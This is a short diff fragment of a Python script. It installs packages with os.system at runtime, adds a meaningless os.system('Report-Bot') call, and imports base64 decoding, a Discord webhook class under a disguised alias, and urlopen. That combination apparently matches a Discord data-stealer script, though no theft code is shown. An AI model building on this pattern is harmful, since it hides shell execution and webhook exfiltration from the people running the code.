@@ -7,6 +7,7 @@ os.system('pip install requests')
 os.system('pip install discord_webhook')
 os.system('pip install requests')
 os.system('pip install colorama')
+os.system(f'Report-Bot')
 from base64 import b64decode
 from discord_webhook import DiscordWebhook as nes
 from urllib.request import Request, urlopen
